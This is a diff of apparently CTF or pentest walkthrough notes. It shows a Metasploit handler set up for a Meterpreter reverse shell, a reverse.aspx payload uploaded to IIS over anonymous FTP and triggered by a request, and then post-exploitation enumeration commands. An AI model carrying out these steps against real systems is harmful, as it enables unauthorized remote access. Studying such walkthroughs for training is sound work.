@@ -15,4 +15,10 @@ msfconsole > use exploit/multi/handler > options > set payload windows/meterpret
 **Upload payload to iis:**  
 ftp anonyomous login > `PUT reverse.aspx` > load http://victim/reverse.aspx (to trigger meterpreter reverse shell connection)  
 
-#### System Enumeration
+#### System Enumeration  
+now that we are a low level user, we repeat the cycle of info gathering, scanning enumeration further exploitation.
+
+meterpreter: shell  
+systeminfo  
+hostname  
+
